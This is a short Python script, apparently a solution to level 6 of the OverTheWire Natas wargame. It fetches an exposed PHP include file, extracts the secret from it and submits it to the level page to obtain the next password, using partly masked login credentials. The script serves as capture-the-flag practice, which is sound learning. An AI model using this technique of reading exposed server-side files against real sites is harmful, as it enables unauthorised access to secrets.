from requests import request as req


auth = ("natas6", "0R...ed")

# php $secret 정보 가져오기
def get_secret():
  res = req(
    auth=auth,
    method="GET",
    url="http://natas6.natas.labs.overthewire.org/includes/secret.inc"
  )

  return res.text.split('"')[1]
  
# 다음 비밀번호 요청
def get_flag(secret: str):
  res = req(
    auth=auth,
    method="POST",
    url="http://natas6.natas.labs.overthewire.org/",
    data={
      "secret": secret,
      "submit": ""
    }
  )

  print(res.text)

secret = get_secret()
get_flag(secret)